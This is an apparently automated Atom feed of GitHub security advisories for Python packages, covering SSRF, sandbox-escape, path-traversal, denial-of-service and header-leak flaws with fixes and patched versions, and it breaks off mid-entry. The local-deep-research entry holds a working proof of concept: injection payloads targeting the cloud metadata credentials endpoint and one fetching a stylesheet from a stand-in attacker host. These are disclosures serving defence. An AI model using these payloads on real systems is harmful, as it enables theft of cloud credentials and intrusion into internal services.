<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-12T08:54:15.545Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[local-deep-research] local-deep-research is Vulnerable to HTML Injection via Unescaped User Input in PDF Export (`pdf_service.py:_markdown_to_html`)]]></title>
        <id>https://github.com/advisories/GHSA-fj2m-qvh9-jq4q</id>
        <link href="https://github.com/advisories/GHSA-fj2m-qvh9-jq4q"/>
        <updated>2026-05-11T19:40:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>PDFService._markdown_to_html()</code> constructs an HTML document by interpolating user-controlled values — specifically <code>title</code> (sourced from <code>research.title</code> or <code>research.query</code>) and <code>metadata</code> key-value pairs — directly into an f-string without any HTML escaping. An authenticated attacker can craft a research query containing HTML special characters to inject arbitrary HTML tags into the document processed by WeasyPrint during PDF export. This injection can be chained to trigger a Server-Side Request Forgery (SSRF), bypassing the application's existing SSRF defenses in <code>ssrf_validator.py</code>.</p>
<hr>
<h2 id="details">Details</h2>
<p><strong>Vulnerable code:</strong> <code>src/local_deep_research/web/services/pdf_service.py</code>, lines 171–176</p>
<pre><code class="language-python"># pdf_service.py:171-176
if title:
    html_parts.append(f"&lt;title&gt;{title}&lt;/title&gt;")   # ← title is not escaped

if metadata:
    for key, value in metadata.items():
        html_parts.append(f'&lt;meta name="{key}" content="{value}"&gt;')  # ← key/value are not escaped
</code></pre>
<p><strong>Data flow trace:</strong></p>
<pre><code>User input: research.query
        │
        ▼
research_routes.py:1321
  pdf_title = research.title or research.query
        │
        ▼
research_routes.py:1325-1326
  export_report_to_memory(report_content, format, title=pdf_title)
        │
        ▼
pdf_service.py:107
  PDFService.markdown_to_pdf(markdown_content, title=pdf_title)
        │
        ▼
pdf_service.py:137
  _markdown_to_html(markdown_content, title, metadata)
        │
        ▼
pdf_service.py:172
  f"&lt;title&gt;{title}&lt;/title&gt;"   ← injection point, no escaping
        │
        ▼
pdf_service.py:112
  HTML(string=html_content)   ← WeasyPrint renders the injected HTML
</code></pre>
<p><code>research.query</code> is a string submitted by the user via <code>POST /api/start_research</code>, stored as-is in the database, and retrieved without any sanitization. When the user triggers <code>POST /api/v1/research/&lt;research_id&gt;/export/pdf</code>, this value is embedded unescaped into the HTML document processed by WeasyPrint.</p>
<p><strong>Injection point 1: <code>&lt;title&gt;</code> tag breakout</strong></p>
<pre><code>Input:    &lt;/title&gt;&lt;img src="http://169.254.169.254/latest/meta-data/" /&gt;
Rendered: &lt;title&gt;&lt;/title&gt;&lt;img src="http://169.254.169.254/latest/meta-data/" /&gt;&lt;/title&gt;
</code></pre>
<p>When WeasyPrint encounters the injected <code>&lt;img&gt;</code> tag, it issues an HTTP GET request to the value of <code>src</code> by default.</p>
<p><strong>Injection point 2: <code>&lt;meta&gt;</code> attribute breakout</strong></p>
<pre><code>Input:    " /&gt;&lt;link rel="stylesheet" href="http://attacker.com/evil.css
Rendered: &lt;meta name="..." content="" /&gt;&lt;link rel="stylesheet" href="http://attacker.com/evil.css"&gt;
</code></pre>
<p>WeasyPrint will fetch and apply the external stylesheet, which also constitutes SSRF.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p><strong>Step 1: Log in and submit a research query containing the injection payload</strong></p>
<pre><code class="language-http">POST /api/start_research HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=&lt;valid_session&gt;

{
  "query": "&lt;/title&gt;&lt;img src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" onerror=\"x\"/&gt;",
  "mode": "quick",
  "model_provider": "OLLAMA",
  "model": "llama3"
}
</code></pre>
<p>The response returns a <code>research_id</code>, e.g. <code>"aaaa-bbbb-cccc-dddd"</code>.</p>
<p><strong>Step 2: After the research completes, trigger PDF export</strong></p>
<pre><code class="language-http">POST /api/v1/research/aaaa-bbbb-cccc-dddd/export/pdf HTTP/1.1
Host: localhost:5000
Cookie: session=&lt;valid_session&gt;
X-CSRFToken: &lt;csrf_token&gt;
</code></pre>
<p><strong>Step 3: Intermediate HTML constructed server-side</strong></p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;&lt;/title&gt;&lt;img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="x"/&gt;&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
...report content...
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p><strong>Step 4: WeasyPrint issues an outbound HTTP request to the injected URL</strong></p>
<p>Observed in network monitoring (e.g. <code>tcpdump</code>) or the target internal service logs:</p>
<pre><code>GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
User-Agent: WeasyPrint/...
</code></pre>
<p><strong>Lightweight verification (no SSRF environment required):</strong></p>
<p>Set the query to:</p>
<pre><code>&lt;/title&gt;&lt;title&gt;INJECTED
</code></pre>
<p>The resulting HTML will contain two <code>&lt;title&gt;</code> tags and the PDF document metadata title will read <code>INJECTED</code>, confirming successful injection.</p>
<hr>
<h2 id="impact">Impact</h2>
<h3 id="1-chained-ssrf-high-severity">1. Chained SSRF (High Severity)</h3>
<p>By injecting <code>&lt;img src&gt;</code>, <code>&lt;link href&gt;</code>, or <code>&lt;style&gt;@import url()</code> tags pointing to internal addresses, WeasyPrint will issue HTTP requests on behalf of the server during PDF generation. This allows access to:</p>
<ul>
<li><strong>Cloud metadata services</strong> (<code>169.254.169.254</code>) on AWS, GCP, or Azure — enabling theft of IAM credentials and instance identity documents.</li>
<li><strong>Internal network services</strong> (<code>192.168.x.x</code>, <code>10.x.x.x</code>) — enabling reconnaissance and interaction with internal APIs not exposed to the internet.</li>
<li><strong>Localhost administrative interfaces</strong> — if SSRF protections are only applied at the user-input validation layer.</li>
</ul>
<p>This is an effective bypass of the application's existing SSRF defenses in <code>ssrf_validator.py</code>, because WeasyPrint's outbound resource requests are never routed through that validator.</p>
<h3 id="2-html-document-structure-corruption">2. HTML Document Structure Corruption</h3>
<p>Injected tags can prematurely close <code>&lt;head&gt;</code> and insert arbitrary content into <code>&lt;body&gt;</code>, causing WeasyPrint to render incorrectly or crash, resulting in a Denial of Service (DoS) condition for the export functionality.</p>
<h3 id="3-css-injection-medium-severity">3. CSS Injection (Medium Severity)</h3>
<p>By injecting <code>&lt;link&gt;</code> or <code>&lt;style&gt;</code> tags that load external stylesheets, an attacker can fully control the visual content of the generated PDF, enabling report content forgery or spoofing.</p>
<h3 id="4-affected-scope">4. Affected Scope</h3>
<ul>
<li>All PDF export operations are affected.</li>
<li>The vulnerability is reachable by any authenticated user — no elevated privileges required.</li>
<li>Because each user operates against their own encrypted database, cross-user exploitation is not possible. However, on any shared or multi-tenant deployment, every authenticated user can independently trigger this vulnerability.</li>
</ul>
<hr>
<h2 id="remediation">Remediation</h2>
<p>Apply <code>html.escape()</code> to all user-controlled values before embedding them in the HTML template inside <code>_markdown_to_html</code>:</p>
<pre><code class="language-python">import html

if title:
    html_parts.append(f"&lt;title&gt;{html.escape(title)}&lt;/title&gt;")

if metadata:
    for key, value in metadata.items():
        html_parts.append(
            f'&lt;meta name="{html.escape(str(key))}" content="{html.escape(str(value))}"&gt;'
        )
</code></pre>
<p>Additionally, consider configuring WeasyPrint with a custom <code>url_fetcher</code> that blocks or restricts outbound HTTP requests to prevent SSRF via injected or legitimately-embedded external resources:</p>
<pre><code class="language-python">def safe_url_fetcher(url, timeout=10):
    from ssrf_validator import validate_url
    if not validate_url(url):
        raise ValueError(f"Blocked unsafe URL in PDF rendering: {url}")
    return weasyprint.default_url_fetcher(url, timeout=timeout)

html_doc = HTML(string=html_content, url_fetcher=safe_url_fetcher)
</code></pre>
<hr>
<p><em>Report generated against commit <code>f3540fb3</code> — local-deep-research, branch <code>main</code>.</em></p>
<hr>
<h2 id="maintainer-note-2026-04-24">Maintainer note (2026-04-24)</h2>
<p>Thanks @Firebasky for the detailed report. The complete remediation spans two PRs, both merged to <code>main</code>:</p>
<p><strong>#3082</strong> (merged 2026-03-29, shipped in <strong>v1.5.0+</strong>) — closes the HTML-injection sinks:</p>
<ul>
<li><code>html.escape()</code> now wraps the <code>title</code> value in <code>&lt;title&gt;…&lt;/title&gt;</code></li>
<li>Same for metadata keys/values in <code>&lt;meta name="…" content="…"&gt;</code></li>
<li>Regression tests added in <code>tests/web/services/test_pdf_service.py</code></li>
</ul>
<p><strong>#3613</strong> (merged 2026-04-24, shipped in <strong>v1.6.0</strong>) — implements the <code>url_fetcher</code> recommendation from the Remediation section:</p>
<ul>
<li>New <code>_safe_url_fetcher</code> in <code>pdf_service.py</code> delegates to <code>weasyprint.default_url_fetcher</code> only after <code>security.ssrf_validator.validate_url</code> accepts the URL</li>
<li>Blocks AWS metadata (169.254.169.254), RFC1918, loopback, and non-http(s) schemes</li>
<li>Covers the chained SSRF path through any URL reaching the rendered HTML — markdown body, citations, raw-HTML passthrough via Python-Markdown</li>
<li>Blocked URLs raise <code>UnsafePDFResourceURLError</code> (a <code>ValueError</code> subclass) so WeasyPrint skips the resource and the render continues</li>
<li>8 regression tests, including an end-to-end render with <code>&lt;img src="http://169.254.169.254/…"&gt;</code> embedded in the body</li>
</ul>
<p><strong>Advisory metadata:</strong> CVSS <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N</code> (5.0 Moderate), CWEs <strong>CWE-79</strong> + <strong>CWE-918</strong>. <strong>Patched in v1.6.0</strong> — upgrade to v1.6.0 or later to receive both fixes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-fj2m-qvh9-jq4q">https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-fj2m-qvh9-jq4q</a></li>
<li><a href="https://github.com/LearningCircuit/local-deep-research/pull/3082">https://github.com/LearningCircuit/local-deep-research/pull/3082</a></li>
<li><a href="https://github.com/LearningCircuit/local-deep-research/pull/3613">https://github.com/LearningCircuit/local-deep-research/pull/3613</a></li>
<li><a href="https://github.com/LearningCircuit/local-deep-research/commit/0148fa265a3da460c07def7441f9ac49ea61fbcb">https://github.com/LearningCircuit/local-deep-research/commit/0148fa265a3da460c07def7441f9ac49ea61fbcb</a></li>
<li><a href="https://github.com/LearningCircuit/local-deep-research/commit/15f13d5c79847f1c38c2dc67bd0027c38af9e34b">https://github.com/LearningCircuit/local-deep-research/commit/15f13d5c79847f1c38c2dc67bd0027c38af9e34b</a></li>
<li><a href="https://github.com/advisories/GHSA-fj2m-qvh9-jq4q">https://github.com/advisories/GHSA-fj2m-qvh9-jq4q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fj2m-qvh9-jq4q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T19:40:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM has a sandbox escape in custom-code guardrail]]></title>
        <id>https://github.com/advisories/GHSA-wxxx-gvqv-xp7p</id>
        <link href="https://github.com/advisories/GHSA-wxxx-gvqv-xp7p"/>
        <updated>2026-05-11T16:17:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>POST /guardrails/test_custom_code</code> endpoint runs user-supplied Python inside a hand-rolled sandbox. The sandbox can be escaped using bytecode-level techniques, allowing arbitrary code execution in the proxy process — which runs as root in the default Docker image.</p>
<p><strong>Reaching the endpoint requires a proxy-admin credential</strong> in default configurations.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong><code>1.83.11</code></strong>. The hand-rolled sandbox has been replaced with <code>RestrictedPython</code>. Upgrade to <code>1.83.11</code> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, block <code>POST /guardrails/test_custom_code</code> at your reverse proxy or API gateway.</p>
<h3 id="references">References</h3>
<ul>
<li>Patched release: <a href="https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable"><code>v1.83.10-stable</code></a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-wxxx-gvqv-xp7p">https://github.com/BerriAI/litellm/security/advisories/GHSA-wxxx-gvqv-xp7p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40217">https://nvd.nist.gov/vuln/detail/CVE-2026-40217</a></li>
<li><a href="https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable">https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable</a></li>
<li><a href="https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm">https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm</a></li>
<li><a href="https://github.com/advisories/GHSA-wxxx-gvqv-xp7p">https://github.com/advisories/GHSA-wxxx-gvqv-xp7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxxx-gvqv-xp7p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T16:17:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] Duplicate Advisory: LiteLLM has a sandbox escape in custom-code guardrail]]></title>
        <id>https://github.com/advisories/GHSA-3926-2jvf-fg29</id>
        <link href="https://github.com/advisories/GHSA-3926-2jvf-fg29"/>
        <updated>2026-05-11T16:17:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-wxxx-gvqv-xp7p. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>LiteLLM through 2026-04-08 allows remote attackers to execute arbitrary code via bytecode rewriting at the /guardrails/test_custom_code URI.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40217">https://nvd.nist.gov/vuln/detail/CVE-2026-40217</a></li>
<li><a href="https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm">https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm</a></li>
<li><a href="https://github.com/advisories/GHSA-3926-2jvf-fg29">https://github.com/advisories/GHSA-3926-2jvf-fg29</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3926-2jvf-fg29</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-10T15:31:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-liquid] python-liquid: Absolute paths escape filesystem loader search path]]></title>
        <id>https://github.com/advisories/GHSA-8p4x-wr7x-3788</id>
        <link href="https://github.com/advisories/GHSA-8p4x-wr7x-3788"/>
        <updated>2026-05-11T14:57:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The built-in <code>FileSystemLoader</code> and <code>CachingFileSystemLoader</code> do not guard against reading files outside their search paths when given an absolute path to resolve. This allows malicious template authors to load and render arbitrary files via the <code>{% include %}</code> and <code>{% render %}</code> tags. Targeted files would need to contain valid Liquid markup and be readable by the application process.</p>
<h3 id="patches">Patches</h3>
<p>The issue is fixed in version 2.2.0 with the inclusion of a <code>template_path.is_absolute()</code> condition in <code>liquid/builtin/loaders/file_system_loader.py</code>.</p>
<pre><code class="language-python">        if os.path.pardir in template_path.parts or template_path.is_absolute():
            raise TemplateNotFoundError(template_name)
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Create a custom template loader by inheriting from <code>FileSystemLoader</code> and overriding <code>resolve_path()</code>. Use an instance of the custom loader as the <code>loader</code> argument when instantiating your Liquid environment. </p>
<pre><code class="language-python">import os
from pathlib import Path

from liquid import Environment
from liquid import FileSystemLoader
from liquid.exceptions import TemplateNotFoundError


class MyFileSystemLoader(FileSystemLoader):
    def resolve_path(self, template_name: str) -&gt; Path:
        template_path = Path(template_name)

        if self.ext and not template_path.suffix:
            template_path = template_path.with_suffix(self.ext)

        if os.path.pardir in template_path.parts or template_path.is_absolute():
            raise TemplateNotFoundError(template_name)

        for path in self.search_path:
            source_path = path.joinpath(template_path)
            if not source_path.exists():
                continue
            return source_path

        raise TemplateNotFoundError(template_name)


env = Environment(loader=MyFileSystemLoader("path/to/templates/"))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jg-rp/liquid/security/advisories/GHSA-8p4x-wr7x-3788">https://github.com/jg-rp/liquid/security/advisories/GHSA-8p4x-wr7x-3788</a></li>
<li><a href="https://github.com/advisories/GHSA-8p4x-wr7x-3788">https://github.com/advisories/GHSA-8p4x-wr7x-3788</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8p4x-wr7x-3788</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:57:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oxidize-pdf] oxidize-pdf: NaN/inf bypass in colour content-stream emission causes PDF rejection (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-88q9-cmp2-c2vq</id>
        <link href="https://github.com/advisories/GHSA-88q9-cmp2-c2vq"/>
        <updated>2026-05-11T14:53:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>  <code>oxidize-pdf</code> defines <code>Color</code> as a <code>pub enum</code> with public tuple-struct variants <code>Rgb(f64, f64, f64)</code>, <code>Gray(f64)</code>, and <code>Cmyk(f64, f64, f64, f64)</code>. The constructors <code>Color::rgb</code>, <code>Color::gray</code>, and <code>Color::cmyk</code> clamp incoming
  components to <code>[0.0, 1.0]</code>, but because the variants are <code>pub</code>, callers can construct values directly without going through the constructors:</p>
<pre><code class="language-rust">let safe   = Color::rgb(f64::NAN, 0.5, 0.5);   // clamps NaN to 0.0
let attack = Color::Rgb(f64::NAN, 0.5, 0.5);    // bypasses clamp

Color: Copy allows the non-finite value to propagate freely through API surfaces and serialisation. When such a value reaches a content-stream emitter, the writer formats it via format!("{:.3}", v). The Rust standard library renders
f64::NAN as "NaN", f64::INFINITY as "inf", and f64::NEG_INFINITY as "-inf" — none of which are valid PDF numeric tokens per ISO 32000-1 §7.3.3:

▎ A numeric object shall be represented by one or more decimal digits with an optional sign and a leading, trailing, or embedded PERIOD.

The resulting content stream contains an invalid token sequence (e.g. NaN 0.500 0.500 rg). Conformant PDF viewers (Adobe Acrobat, Foxit, PDF.js, Apple Preview) reject the content stream, the affected page, or the entire document
depending on parser strictness.

Affected packages (all listed in the "Affected products" section of this advisory):

- oxidize-pdf on crates.io — the core Rust library where the vulnerable code path lives.
- OxidizePdf.NET on NuGet — .NET FFI binding that exposes Color through its public API; inherits the vulnerability from its dependency on oxidize-pdf.
- oxidize-pdf on PyPI — Python bindings (PyO3) that similarly expose colour construction; inherits the vulnerability from its dependency.

Who is impacted: any application that uses these packages to generate PDFs and accepts user-influenced colour values without validation. The most exposed surfaces are server-side PDF generators that take arbitrary f64 colour
parameters from upstream services.

Reproduction (Rust API):
use oxidize_pdf::{Document, Page, graphics::Color};

let mut doc = Document::new();
let mut page = Page::a4();
let gc = page.graphics();
gc.set_fill_color(Color::Rgb(f64::NAN, 0.5, 0.5));
gc.rectangle(50.0, 50.0, 100.0, 100.0).fill();
doc.add_page(page);
doc.save("malformed.pdf").unwrap();

// The resulting content stream contains:
//   NaN 0.500 0.500 rg
//   50 50 100 100 re
//   f
// which conformant viewers reject.

Affected sites in oxidize-pdf 2.5.7 (the same code paths are reached by both .NET and Python bindings via FFI):

- oxidize-pdf-core/src/text/flow.rs (TextFlowContext)
- oxidize-pdf-core/src/text/mod.rs (TextContext::apply_text_state_parameters)
- oxidize-pdf-core/src/graphics/mod.rs (GraphicsContext::apply_fill_color / apply_stroke_color)
- oxidize-pdf-core/src/graphics/patterns.rs (create_checkerboard_pattern / create_stripe_pattern / create_dots_pattern)
- ~45 sibling sites across forms/*, annotations/*, layout/rich_text.rs, and writer/pdf_writer/mod.rs that emit colour through the same code path.

Patches

The fix introduces a sanitising helper at the emission boundary in graphics/color.rs:

pub(crate) fn finite_or_zero(val: f64) -&gt; f64 {
    if val.is_finite() { val } else { 0.0 }
}

Every colour-operator emitter (~50 sites across 17 files) now routes through fill_color_op / stroke_color_op / write_fill_color / write_stroke_color, which apply finite_or_zero before formatting. Non-finite components are substituted
with 0.0, so the wire format remains ISO 32000-1 conformant regardless of the input.

Patched releases:

- oxidize-pdf 2.6.0 on crates.io — contains the fix at the source.
- OxidizePdf.NET on NuGet — bumped to depend on oxidize-pdf 2.6.0 (see "Patched versions" above).
- oxidize-pdf on PyPI — bumped to depend on oxidize-pdf 2.6.0 (see "Patched versions" above).

Users should upgrade to the patched version of whichever package(s) they consume.

Workarounds

For users who cannot upgrade immediately:

- Always construct colours via the safe constructors Color::rgb(), Color::gray(), Color::cmyk(), which clamp components to [0.0, 1.0] (no NaN/inf survives clamping).
- Never use direct enum construction (Color::Rgb(...), Color::Gray(...), Color::Cmyk(...)) when components originate from untrusted input. The same applies to the corresponding APIs in the .NET and Python bindings.
- Validate untrusted f64 colour inputs with f64::is_finite() (Rust) or equivalent checks (!double.IsFinite(v) in .NET, math.isfinite(v) in Python) before passing them to any oxidize-pdf API.

These mitigations are partial — they cover the application layer but not other code paths that may construct Color values internally. The full fix is the upgrade to the patched versions.

References

- Issue: https://github.com/bzsanti/oxidizePdf/issues/220
- Companion refactor: https://github.com/bzsanti/oxidizePdf/issues/221
- Fix PR: https://github.com/bzsanti/oxidizePdf/pull/225
- Release PR (oxidize-pdf 2.6.0): https://github.com/bzsanti/oxidizePdf/pull/226
- .NET binding repository: https://github.com/bzsanti/oxidize-pdf-dotnet
- Python binding repository: https://github.com/bzsanti/oxidize-python
- ISO 32000-1 §7.3.3 (Numeric Objects): https://www.iso.org/standard/51502.html

A broader follow-up tracks the same CWE class in non-colour numeric content-stream emitters (line widths, transformation matrices, dash arrays, text positioning, path operators) — to be addressed in oxidize-pdf 2.7.0 with its own
advisory.
### References

- &lt;https://github.com/bzsanti/oxidizePdf/security/advisories/GHSA-88q9-cmp2-c2vq&gt;
- &lt;https://github.com/advisories/GHSA-88q9-cmp2-c2vq&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88q9-cmp2-c2vq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-11T14:53:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib3] urllib3: Decompression-bomb safeguards bypassed in parts of the streaming API]]></title>
        <id>https://github.com/advisories/GHSA-mf9v-mfxr-j63j</id>
        <link href="https://github.com/advisories/GHSA-mf9v-mfxr-j63j"/>
        <updated>2026-05-11T14:51:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>urllib3's <a href="https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o">streaming API</a> is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.</p>
<p>urllib3 can perform decompression based on the HTTP <code>Content-Encoding</code> header (e.g., <code>gzip</code>, <code>deflate</code>, <code>br</code>, or <code>zstd</code>). When using the streaming API since version 2.6.0, the library decompresses only the necessary bytes, enabling partial content consumption.</p>
<p>However, urllib3 before version 2.7.0 could still decompress the whole response instead of the requested portion in two cases:</p>
<ol>
<li>During the second <code>HTTPResponse.read(amt=N)</code> call when the response was decompressed using the official <a href="https://pypi.org/project/brotli/">Brotli</a> library.</li>
<li>When <code>HTTPResponse.drain_conn()</code> was called after the response had been read and decompressed partially (compression algorithm did not matter here).</li>
</ol>
<p>These issues could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This could result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side.</p>
<h3 id="affected-usages">Affected usages</h3>
<p>Applications and libraries using urllib3 versions earlier than 2.7.0 may be affected when streaming compressed responses from untrusted sources in either of these cases, unless decompression is explicitly disabled:</p>
<ol>
<li>A response encoded with <code>br</code> is read incrementally with at least two <code>HTTPResponse.read(amt=N)</code> or <code>HTTPResponse.stream(amt=N)</code> calls while using the official <a href="https://pypi.org/project/brotli/">Brotli</a> library.</li>
<li><code>HTTPResponse.drain_conn()</code> is called after response decompression has already started.</li>
</ol>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to at least urllib3 version 2.7.0 in which the library:</p>
<ol>
<li>Is more efficient for reads with Brotli.</li>
<li>Always skips decompression for <code>HTTPResponse.drain_conn()</code>.</li>
</ol>
<p>If upgrading is not immediately possible, the following workarounds may reduce exposure in specific cases:</p>
<ol>
<li>For the Brotli-specific issue only, switch from <a href="https://pypi.org/project/brotli/">brotli</a> to <a href="https://pypi.org/project/brotlicffi/">brotlicffi</a> until you can upgrade urllib3; the official Brotli package is affected because of <a href="https://github.com/google/brotli/issues/1396">https://github.com/google/brotli/issues/1396</a>.</li>
<li>If your code explicitly calls <code>HTTPResponse.drain_conn()</code>, call <code>HTTPResponse.close()</code> instead when connection reuse is not important.</li>
</ol>
<h3 id="credits">Credits</h3>
<p>The Brotli-specific issue was reported by @kimkou2024.
<code>HTTPResponse.drain_conn()</code> inefficiency was reported by @Cycloctane.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/urllib3/urllib3/security/advisories/GHSA-mf9v-mfxr-j63j">https://github.com/urllib3/urllib3/security/advisories/GHSA-mf9v-mfxr-j63j</a></li>
<li><a href="https://github.com/advisories/GHSA-mf9v-mfxr-j63j">https://github.com/advisories/GHSA-mf9v-mfxr-j63j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mf9v-mfxr-j63j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:51:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib3] urllib3: Sensitive headers forwarded across origins in proxied low-level redirects]]></title>
        <id>https://github.com/advisories/GHSA-qccp-gfcp-xxvc</id>
        <link href="https://github.com/advisories/GHSA-qccp-gfcp-xxvc"/>
        <updated>2026-05-11T14:51:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When following cross-origin redirects for requests made using urllib3’s high-level APIs, such as <code>urllib3.request()</code>, <code>PoolManager.request()</code>, and <code>ProxyManager.request()</code>, sensitive headers — <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code> (defined in <code>Retry.DEFAULT_REMOVE_HEADERS_ON_REDIRECT</code>) — are stripped by default, as expected.</p>
<p>However, cross-origin redirects followed from the low-level API via <code>ProxyManager.connection_from_url().urlopen(..., assert_same_host=False)</code> still forward these sensitive headers.</p>
<h3 id="affected-usage">Affected usage</h3>
<p>Applications and libraries using urllib3 versions earlier than 2.7.0 may be affected if they allow cross-origin redirects while making requests through <code>HTTPConnection.urlopen()</code> instances created via <code>ProxyManager.connection_from_url()</code>.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to urllib3 version 2.7.0 or later, in which sensitive headers are stripped from redirects followed by <code>HTTPConnection</code>.</p>
<p>If upgrading is not immediately possible, avoid using this low-level redirect flow for cross-origin redirects. If appropriate for your use case, switch to <code>ProxyManager.request()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc">https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc</a></li>
<li><a href="https://github.com/advisories/GHSA-qccp-gfcp-xxvc">https://github.com/advisories/GHSA-qccp-gfcp-xxvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qccp-gfcp-xxvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-11T14:51:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[guarddog] GuardDog has a blind GitHub URL rewrite in remote project scanning causes SSRF and `GH_TOKEN` exfiltration]]></title>
        <id>https://github.com/advisories/GHSA-587r-mc96-6f2p</id>
        <link href="https://github.com/advisories/GHSA-587r-mc96-6f2p"/>
        <updated>2026-05-11T14:45:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The programmatic remote project scanning path rewrites attacker-controlled repository URLs using a blind string replacement and then sends the caller's GitHub credentials with the resulting request. This allows an attacker who can influence the scanned repository URL to trigger SSRF and capture the <code>GH_TOKEN</code> used by GuardDog.</p>
<h1 id="description">Description</h1>
<p><code>ProjectScanner.scan_remote()</code> takes a <code>url</code>, <code>branch</code>, and <code>requirements_name</code>, then constructs a raw GitHub URL by calling:</p>
<pre><code class="language-python">githubusercontent_url = url.replace("github", "raw.githubusercontent")
req_url = f"{githubusercontent_url}/{branch}/{requirements_name}"
resp = requests.get(url=req_url, auth=token)
</code></pre>
<p>Because this logic does not parse or validate the hostname, a crafted URL such as:</p>
